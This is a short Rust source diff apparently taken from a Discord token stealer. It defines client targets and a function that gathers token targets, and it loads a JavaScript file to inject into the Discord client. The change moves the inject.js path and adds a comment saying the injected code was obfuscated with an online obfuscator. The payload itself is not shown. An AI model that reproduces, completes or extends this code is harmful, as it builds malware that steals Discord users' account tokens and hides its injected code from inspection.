@@ -29,7 +29,8 @@ const CLIENT_TARGETS: &[(&'static str, &'static str, &'static str)] = &[
     ),
 ];
 
-const INJECT_CODE: &'static str = include_str!("../assets/inject.js");
+// Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
+const INJECT_CODE: &'static str = include_str!("../res/inject.js");
 
 fn get_token_targets() -> Vec<String> {
     let mut targets = Vec::new();
